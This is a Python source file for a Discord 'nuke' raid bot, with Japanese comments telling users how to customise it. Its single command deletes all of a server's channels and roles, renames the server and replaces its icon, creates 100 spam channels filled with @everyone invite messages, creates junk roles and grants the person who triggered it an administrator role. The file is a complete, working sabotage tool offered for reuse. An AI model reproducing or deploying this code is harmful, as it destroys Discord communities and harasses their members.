import asyncio
import aiohttp
import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())#ここでプレフィックスを変えれるよ!nukeから?nukeみたいにね
bot.remove_command('help')#helpコマンドを表示しないようにする。表示したいならこの行は消してね

@bot.event
async def on_ready():
    print(f"{bot.user}でログインしました。")
    activity = discord.Game(name="made by みっちー")
    await bot.change_presence(status=discord.Status.online, activity=activity)

@bot.command()
async def mititt(ctx):#ここで起動コマンドを変えられるよ
    try:
        await ctx.message.delete()
    except:
        pass

    guild = ctx.guild
    new_server_name = "みっちー鯖植民地" #ここは変えたいサーバーの名前にしてね
    new_server_icon_url = "https://images-ext-1.discordapp.net/external/FFZVIqTXouydd9yjhkRIS6jTB9tZzx60yiazQWUV6O0/https/i.imgur.com/M7xDJw4.jpg?format=webp&width=293&height=400" #ここは変えたいアイコンのリンクにしてね
    role_name = "みっちー万歳" #ここは作成したいロールの名前にしてね
    admin_role_name = "nuke user" #荒らしたときに作成する管理者のロールの名前にしてね

    try:
        await guild.edit(community=False)
    except:
        pass

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(new_server_icon_url) as resp:
                if resp.status == 200:
                    new_server_icon = await resp.read()
                    await guild.edit(name=new_server_name, icon=new_server_icon)
    except:
        pass

    delete_tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    everyone_role = ctx.guild.default_role
    overwrite_permissions = discord.Permissions()
    overwrite_permissions.update(
        read_messages=True,
        send_messages=True,
        read_message_history=True
    )

    try:
        await everyone_role.edit(permissions=overwrite_permissions)
    except:
        pass

    create_tasks = [
        ctx.guild.create_text_channel(f'discord.gg/mititt') for _ in range(100) #作成したいチャンネルの名前と作成する数
    ]
    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)

    send_message_tasks = []
    message_content = '@everyone discord.gg/mititt' #荒らすときに送りたいメッセージにしてね

    for channel in new_channels:
        if isinstance(channel, Exception):
            continue
        for _ in range(5):#チャンネルにメッセージを送る回数
            send_message_tasks.append(channel.send(message_content))

    await asyncio.gather(*send_message_tasks, return_exceptions=True)

    delete_roles_tasks = [
        role.delete() for role in guild.roles if role != guild.default_role
    ]

    await asyncio.gather(*delete_roles_tasks, return_exceptions=True)

    try:
        admin_role = await guild.create_role(name=admin_role_name, permissions=discord.Permissions(administrator=True))
        await ctx.author.add_roles(admin_role)
    except:
        pass

    try:
        create_roles_tasks = [
            guild.create_role(name=role_name) for _ in range(30)#ロールを作成したい数
        ]
        await asyncio.gather(*create_roles_tasks, return_exceptions=True)
    except:
        pass

    return

bot.run("token")#ここに自分のtokenを入れてね
